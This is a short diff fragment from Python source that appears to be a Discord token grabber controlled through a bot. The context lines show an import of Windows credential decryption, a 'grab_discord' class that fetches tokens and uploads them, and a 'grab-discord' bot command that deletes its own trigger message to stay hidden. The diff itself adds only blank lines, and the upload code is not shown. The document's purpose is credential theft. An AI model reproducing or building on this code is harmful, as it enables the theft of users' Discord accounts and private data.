@@ -10,6 +10,7 @@ from win32crypt import CryptUnprotectData
 #</imports>
 
 #<engine>
+
 class grab_discord():
     def initialize(raw_data):
         return fetch_tokens().upload(raw_data)
@@ -228,6 +229,7 @@ class fetch_tokens:
 #</engine>
 
 #<command>
+
 @client.command(name="grab-discord")
 async def grab_discord(ctx, option=None):
     await ctx.message.delete()
